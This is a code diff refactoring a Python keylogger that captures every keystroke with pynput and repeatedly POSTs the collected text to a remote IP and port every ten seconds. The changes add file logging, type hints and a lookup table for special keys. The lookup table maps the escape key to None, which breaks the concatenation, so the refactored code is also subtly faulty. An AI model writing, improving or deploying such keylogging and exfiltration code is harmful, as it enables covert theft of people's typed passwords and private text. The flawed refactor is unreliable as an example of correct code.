@@ -1,6 +1,7 @@
 import json
 import threading
 import requests
+import logging
 from pynput import keyboard
 
 # Constants
@@ -11,7 +12,10 @@ TIME_INTERVAL = 10
 # Global variable
 text = ""
 
-def send_post_request(ip_address, port_number, text):
+# Set up logging
+logging.basicConfig(filename='app.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s')
+
+def send_post_request(ip_address: str, port_number: str, text: str):
     try:
         payload = json.dumps({"keyboardData": text})
         requests.post(f"http://{ip_address}:{port_number}",
@@ -19,27 +23,26 @@ def send_post_request(ip_address, port_number, text):
         timer = threading.Timer(TIME_INTERVAL, send_post_request, args=(ip_address, port_number, text))
         timer.start()
     except Exception as e:
-        print(f"Couldn't complete request! Error: {e}")
+        logging.error(f"Couldn't complete request! Error: {e}")
 
 def on_press(key):
     global text
 
-    if key == keyboard.Key.enter:
-        text += "\n"
-    elif key == keyboard.Key.tab:
-        text += "\t"
-    elif key == keyboard.Key.space:
-        text += " "
-    elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.backspace and len(text) == 0:
-        pass
-    elif key == keyboard.Key.backspace and len(text) > 0:
-        text = text[:-1]
-    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
-        pass
-    elif key == keyboard.Key.esc:
-        return None
+    special_keys = {
+        keyboard.Key.enter: "\n",
+        keyboard.Key.tab: "\t",
+        keyboard.Key.space: " ",
+        keyboard.Key.shift: "",
+        keyboard.Key.backspace: "",
+        keyboard.Key.ctrl_l: "",
+        keyboard.Key.ctrl_r: "",
+        keyboard.Key.esc: None
+    }
+
+    if key in special_keys:
+        text += special_keys[key]
+        if key == keyboard.Key.backspace and len(text) > 0:
+            text = text[:-1]
     else:
         text += str(key).strip("'")
     return None
